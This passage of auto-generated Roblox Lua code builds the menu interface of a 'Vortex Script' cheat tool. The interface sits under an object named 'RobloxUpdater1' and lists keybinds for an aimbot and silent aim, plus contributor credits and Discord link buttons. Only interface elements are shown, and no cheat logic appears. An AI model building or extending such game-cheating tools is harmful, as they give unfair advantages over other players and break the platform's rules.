UI["8f"] = Instance.new("UIGradient", UI["8e"])
UI["8f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 206, 206))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.CloseScript \\ --
UI["90"] = Instance.new("LocalScript", UI["89"])
UI["90"]["Name"] = [[CloseScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP \\ --
UI["91"] = Instance.new("Frame", UI["e"])
UI["91"]["BorderSizePixel"] = 0
UI["91"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["91"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["91"]["Position"] = UDim2.new(0.225, 0, 0.15519, 0)
UI["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["91"]["Name"] = [[STARTUP]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.TEXT \\ --
UI["92"] = Instance.new("TextLabel", UI["91"])
UI["92"]["BorderSizePixel"] = 0
UI["92"]["TextTransparency"] = 0.44
UI["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["92"]["TextSize"] = 28
UI["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["92"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["92"]["BackgroundTransparency"] = 1
UI["92"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["92"]["Text"] = [[Vortex Script]]
UI["92"]["Name"] = [[TEXT]]
UI["92"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.TEXT.UICorner \\ --
UI["93"] = Instance.new("UICorner", UI["92"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.TEXT.Underline \\ --
UI["94"] = Instance.new("Frame", UI["92"])
UI["94"]["BorderSizePixel"] = 0
UI["94"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["94"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["94"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["94"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr \\ --
UI["95"] = Instance.new("TextLabel", UI["91"])
UI["95"]["TextWrapped"] = true
UI["95"]["BorderSizePixel"] = 0
UI["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["95"]["TextSize"] = 24
UI["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic)
UI["95"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["95"]["BackgroundTransparency"] = 1
UI["95"]["Size"] = UDim2.new(0, 155, 0, 50)
UI["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["95"]["Text"] = [[Contributors:]]
UI["95"]["Name"] = [[Contr]]
UI["95"]["Position"] = UDim2.new(0, 0, 0.19423, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel \\ --
UI["96"] = Instance.new("TextLabel", UI["95"])
UI["96"]["TextWrapped"] = true
UI["96"]["BorderSizePixel"] = 0
UI["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["96"]["TextSize"] = 32
UI["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["96"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["96"]["BackgroundTransparency"] = 1
UI["96"]["Size"] = UDim2.new(0, 150, 0, 50)
UI["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["96"]["Text"] = [[Nexar Team]]
UI["96"]["Position"] = UDim2.new(0.00084, 0, 1.50484, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel.UIGradient \\ --
UI["97"] = Instance.new("UIGradient", UI["96"])
UI["97"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel.TextLabel \\ --
UI["98"] = Instance.new("TextLabel", UI["96"])
UI["98"]["TextWrapped"] = true
UI["98"]["BorderSizePixel"] = 0
UI["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["98"]["TextSize"] = 22
UI["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["98"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["98"]["BackgroundTransparency"] = 1
UI["98"]["Size"] = UDim2.new(0, 149, 0, 65)
UI["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["98"]["Text"] = [[thx an all ðŸ’™]]
UI["98"]["Position"] = UDim2.new(0.00667, 0, 0.84484, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel.TextLabel.UIGradient \\ --
UI["99"] = Instance.new("UIGradient", UI["98"])
UI["99"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel \\ --
UI["9a"] = Instance.new("TextLabel", UI["95"])
UI["9a"]["TextWrapped"] = true
UI["9a"]["BorderSizePixel"] = 0
UI["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["9a"]["TextSize"] = 32
UI["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["9a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["9a"]["BackgroundTransparency"] = 1
UI["9a"]["Size"] = UDim2.new(0, 150, 0, 50)
UI["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["9a"]["Text"] = [[VortexHub]]
UI["9a"]["Position"] = UDim2.new(0.00729, 0, 0.88484, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Contr.TextLabel.UIGradient \\ --
UI["9b"] = Instance.new("UIGradient", UI["9a"])
UI["9b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.UICorner \\ --
UI["9c"] = Instance.new("UICorner", UI["91"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.Underline \\ --
UI["9d"] = Instance.new("Frame", UI["91"])
UI["9d"]["BorderSizePixel"] = 0
UI["9d"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["9d"]["Size"] = UDim2.new(0, 2, 0, -180)
UI["9d"]["Position"] = UDim2.new(0.34234, 0, 0.91853, 0)
UI["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["9d"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.UIGradient \\ --
UI["9e"] = Instance.new("UIGradient", UI["91"])
UI["9e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2 \\ --
UI["9f"] = Instance.new("ScrollingFrame", UI["91"])
UI["9f"]["Active"] = true
UI["9f"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["9f"]["BorderSizePixel"] = 0
UI["9f"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["9f"]["AutoLocalize"] = false
UI["9f"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["9f"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["9f"]["Name"] = [[ScrollingFrame2]]
UI["9f"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["9f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["9f"]["Size"] = UDim2.new(0, 282, 0, 179)
UI["9f"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["9f"]["Position"] = UDim2.new(0.3491, 0, 0.23151, 0)
UI["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["9f"]["ScrollBarThickness"] = 5
UI["9f"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS \\ --
UI["a0"] = Instance.new("TextLabel", UI["9f"])
UI["a0"]["TextWrapped"] = true
UI["a0"]["BorderSizePixel"] = 0
UI["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a0"]["TextSize"] = 24
UI["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic)
UI["a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a0"]["BackgroundTransparency"] = 1
UI["a0"]["Size"] = UDim2.new(0, 265, 0, 50)
UI["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a0"]["Text"] = [[Keybinds:]]
UI["a0"]["Name"] = [[KeyBINDS]]
UI["a0"]["Position"] = UDim2.new(0.03696, 0, -0.05999, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text \\ --
UI["a1"] = Instance.new("TextLabel", UI["a0"])
UI["a1"]["TextWrapped"] = true
UI["a1"]["BorderSizePixel"] = 0
UI["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a1"]["TextSize"] = 29
UI["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a1"]["BackgroundTransparency"] = 1
UI["a1"]["Size"] = UDim2.new(0, 246, 0, 36)
UI["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a1"]["Text"] = [[Open/Close UI: T/+]]
UI["a1"]["Name"] = [[text]]
UI["a1"]["Position"] = UDim2.new(0, 0, 0.81589, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text.UIGradient \\ --
UI["a2"] = Instance.new("UIGradient", UI["a1"])
UI["a2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text \\ --
UI["a3"] = Instance.new("TextLabel", UI["a0"])
UI["a3"]["TextWrapped"] = true
UI["a3"]["BorderSizePixel"] = 0
UI["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a3"]["TextSize"] = 29
UI["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a3"]["BackgroundTransparency"] = 1
UI["a3"]["Size"] = UDim2.new(0, 257, 0, 36)
UI["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a3"]["Text"] = [[Open/Close Aimbot: L]]
UI["a3"]["Name"] = [[text]]
UI["a3"]["Position"] = UDim2.new(0, 0, 1.50577, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text.UIGradient \\ --
UI["a4"] = Instance.new("UIGradient", UI["a3"])
UI["a4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text \\ --
UI["a5"] = Instance.new("TextLabel", UI["a0"])
UI["a5"]["TextWrapped"] = true
UI["a5"]["BorderSizePixel"] = 0
UI["a5"]["TextTransparency"] = 0.51
UI["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a5"]["TextSize"] = 16
UI["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a5"]["BackgroundTransparency"] = 1
UI["a5"]["Size"] = UDim2.new(0, 246, 0, 64)
UI["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a5"]["Text"] = [[The update is in beta version V2.9.6, errors could occur!]]
UI["a5"]["Name"] = [[text]]
UI["a5"]["Position"] = UDim2.new(0, 0, 2.82577, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text.UIGradient \\ --
UI["a6"] = Instance.new("UIGradient", UI["a5"])
UI["a6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text \\ --
UI["a7"] = Instance.new("TextLabel", UI["a0"])
UI["a7"]["TextWrapped"] = true
UI["a7"]["BorderSizePixel"] = 0
UI["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a7"]["TextSize"] = 29
UI["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a7"]["BackgroundTransparency"] = 1
UI["a7"]["Size"] = UDim2.new(0, 246, 0, 36)
UI["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a7"]["Text"] = [[Open/Close SilentAim: K]]
UI["a7"]["Name"] = [[text]]
UI["a7"]["Position"] = UDim2.new(0, 0, 2.22577, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text.UIGradient \\ --
UI["a8"] = Instance.new("UIGradient", UI["a7"])
UI["a8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text \\ --
UI["a9"] = Instance.new("TextLabel", UI["a0"])
UI["a9"]["TextWrapped"] = true
UI["a9"]["BorderSizePixel"] = 0
UI["a9"]["TextTransparency"] = 0.51
UI["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["a9"]["TextSize"] = 16
UI["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["a9"]["BackgroundTransparency"] = 1
UI["a9"]["Size"] = UDim2.new(0, 246, 0, 64)
UI["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["a9"]["Text"] = [[You can see the changelog on the Vortex Discord server!]]
UI["a9"]["Name"] = [[text]]
UI["a9"]["Position"] = UDim2.new(0, 0, 3.82577, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.KeyBINDS.text.UIGradient \\ --
UI["aa"] = Instance.new("UIGradient", UI["a9"])
UI["aa"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 209, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 158, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.UIListLayout \\ --
UI["ab"] = Instance.new("UIListLayout", UI["9f"])
UI["ab"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["ab"]["Padding"] = UDim.new(0, 40)
UI["ab"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.STARTUP.ScrollingFrame2.UIPadding \\ --
UI["ac"] = Instance.new("UIPadding", UI["9f"])
UI["ac"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials \\ --
UI["ad"] = Instance.new("Frame", UI["e"])
UI["ad"]["Visible"] = false
UI["ad"]["BorderSizePixel"] = 0
UI["ad"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["ad"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["ad"]["Position"] = UDim2.new(0.225, 0, 0.15519, 0)
UI["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["ad"]["Name"] = [[Socials]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT \\ --
UI["ae"] = Instance.new("TextLabel", UI["ad"])
UI["ae"]["BorderSizePixel"] = 0
UI["ae"]["TextTransparency"] = 0.44
UI["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ae"]["TextSize"] = 28
UI["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["ae"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ae"]["BackgroundTransparency"] = 1
UI["ae"]["Size"] = UDim2.new(0, 444, 0, 23)
UI["ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["ae"]["Text"] = [[All Social Links]]
UI["ae"]["Name"] = [[TEXT]]
UI["ae"]["Position"] = UDim2.new(0, 0, 0.05319, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT.UICorner \\ --
UI["af"] = Instance.new("UICorner", UI["ae"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT.Underline \\ --
UI["b0"] = Instance.new("Frame", UI["ae"])
UI["b0"]["BorderSizePixel"] = 0
UI["b0"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["b0"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["b0"]["Position"] = UDim2.new(0.27378, 0, 1.34472, 0)
UI["b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["b0"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.UICorner \\ --
UI["b1"] = Instance.new("UICorner", UI["ad"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.UIGradient \\ --
UI["b2"] = Instance.new("UIGradient", UI["ad"])
UI["b2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord \\ --
UI["b3"] = Instance.new("TextButton", UI["ad"])
UI["b3"]["BorderSizePixel"] = 0
UI["b3"]["TextSize"] = 20
UI["b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["b3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["b3"]["Size"] = UDim2.new(0, 168, 0, 50)
UI["b3"]["BackgroundTransparency"] = 0.85
UI["b3"]["Name"] = [[CopyDiscord]]
UI["b3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["b3"]["Text"] = [[Copy Discord Link]]
UI["b3"]["Position"] = UDim2.new(0.57234, 0, 0.29008, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UICorner \\ --
UI["b4"] = Instance.new("UICorner", UI["b3"])
UI["b4"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UIGradient \\ --
UI["b5"] = Instance.new("UIGradient", UI["b3"])
UI["b5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 196, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 137, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UIStroke \\ --
UI["b6"] = Instance.new("UIStroke", UI["b3"])
UI["b6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["b6"]["Thickness"] = 1.5

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift \\ --
UI["b7"] = Instance.new("TextLabel", UI["b3"])
UI["b7"]["BorderSizePixel"] = 0
UI["b7"]["TextTransparency"] = 0.51
UI["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["b7"]["TextSize"] = 20
UI["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["b7"]["BackgroundTransparency"] = 1
UI["b7"]["Size"] = UDim2.new(0, 236, 0, 36)
UI["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["b7"]["Text"] = [[Join Vortex Discord for more]]
UI["b7"]["Name"] = [[Ã¼berschrift]]
UI["b7"]["Position"] = UDim2.new(-1.46179, 0, 0, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift.2 text \\ --
UI["b8"] = Instance.new("TextLabel", UI["b7"])
UI["b8"]["BorderSizePixel"] = 0
UI["b8"]["TextTransparency"] = 0.32
UI["b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["b8"]["TextSize"] = 20
UI["b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["b8"]["BackgroundTransparency"] = 1
UI["b8"]["Size"] = UDim2.new(0, 235, 0, 41)
UI["b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["b8"]["Text"] = [[Informations]]
UI["b8"]["Name"] = [[2 text]]
UI["b8"]["Position"] = UDim2.new(0.00055, 0, 0.71653, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift.2 text.UIGradient \\ --
UI["b9"] = Instance.new("UIGradient", UI["b8"])
UI["b9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 196, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 137, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Click Sound \\ --
UI["ba"] = Instance.new("LocalScript", UI["b3"])
UI["ba"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.ClickToCopy \\ --
UI["bb"] = Instance.new("LocalScript", UI["b3"])
UI["bb"]["Name"] = [[ClickToCopy]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT \\ --
UI["bc"] = Instance.new("TextLabel", UI["ad"])
UI["bc"]["BorderSizePixel"] = 0
UI["bc"]["TextTransparency"] = 0.44
UI["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["bc"]["TextSize"] = 28
UI["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["bc"]["BackgroundTransparency"] = 1
UI["bc"]["Size"] = UDim2.new(0, 444, 0, 23)
UI["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["bc"]["Text"] = [[All Social Links]]
UI["bc"]["Name"] = [[TEXT]]
UI["bc"]["Position"] = UDim2.new(0, 0, 0.05319, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT.UICorner \\ --
UI["bd"] = Instance.new("UICorner", UI["bc"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.TEXT.Underline \\ --
UI["be"] = Instance.new("Frame", UI["bc"])
UI["be"]["BorderSizePixel"] = 0
UI["be"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["be"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["be"]["Position"] = UDim2.new(0.27378, 0, 1.34472, 0)
UI["be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["be"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord \\ --
UI["bf"] = Instance.new("TextButton", UI["ad"])
UI["bf"]["BorderSizePixel"] = 0
UI["bf"]["TextSize"] = 20
UI["bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["bf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["bf"]["Size"] = UDim2.new(0, 168, 0, 50)
UI["bf"]["BackgroundTransparency"] = 0.85
UI["bf"]["Name"] = [[CopyDiscord]]
UI["bf"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["bf"]["Text"] = [[Copy Discord Link]]
UI["bf"]["Position"] = UDim2.new(0.57234, 0, 0.60687, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UICorner \\ --
UI["c0"] = Instance.new("UICorner", UI["bf"])
UI["c0"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UIGradient \\ --
UI["c1"] = Instance.new("UIGradient", UI["bf"])
UI["c1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 196, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 137, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.UIStroke \\ --
UI["c2"] = Instance.new("UIStroke", UI["bf"])
UI["c2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["c2"]["Thickness"] = 1.5

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift \\ --
UI["c3"] = Instance.new("TextLabel", UI["bf"])
UI["c3"]["BorderSizePixel"] = 0
UI["c3"]["TextTransparency"] = 0.51
UI["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["c3"]["TextSize"] = 20
UI["c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["c3"]["BackgroundTransparency"] = 1
UI["c3"]["Size"] = UDim2.new(0, 236, 0, 36)
UI["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["c3"]["Text"] = [[Join Nexar Discord for more]]
UI["c3"]["Name"] = [[Ã¼berschrift]]
UI["c3"]["Position"] = UDim2.new(-1.46179, 0, 0, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift.2 text \\ --
UI["c4"] = Instance.new("TextLabel", UI["c3"])
UI["c4"]["BorderSizePixel"] = 0
UI["c4"]["TextTransparency"] = 0.32
UI["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["c4"]["TextSize"] = 20
UI["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["c4"]["BackgroundTransparency"] = 1
UI["c4"]["Size"] = UDim2.new(0, 235, 0, 41)
UI["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["c4"]["Text"] = [[Informations]]
UI["c4"]["Name"] = [[2 text]]
UI["c4"]["Position"] = UDim2.new(0.00055, 0, 0.71653, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Ã¼berschrift.2 text.UIGradient \\ --
UI["c5"] = Instance.new("UIGradient", UI["c4"])
UI["c5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 196, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 137, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Click Sound \\ --
UI["c6"] = Instance.new("LocalScript", UI["bf"])
